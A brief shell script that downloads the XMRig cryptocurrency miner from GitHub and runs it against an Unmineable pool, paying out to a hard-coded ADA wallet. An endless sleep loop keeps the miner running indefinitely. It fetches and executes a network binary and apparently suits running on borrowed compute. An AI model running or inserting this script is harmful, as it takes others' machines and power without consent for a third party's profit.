#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -a rx -k -u ADA:DdzFFzCqrhtBJ94bpkDb2m4fobZcT7WBJZHrcCNtSLBs6qdzQNgCE592Mau7a8LgsMdSxbg56fYqAhG7kTqKxSpFpoSrrSCPUDoeTWvX -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
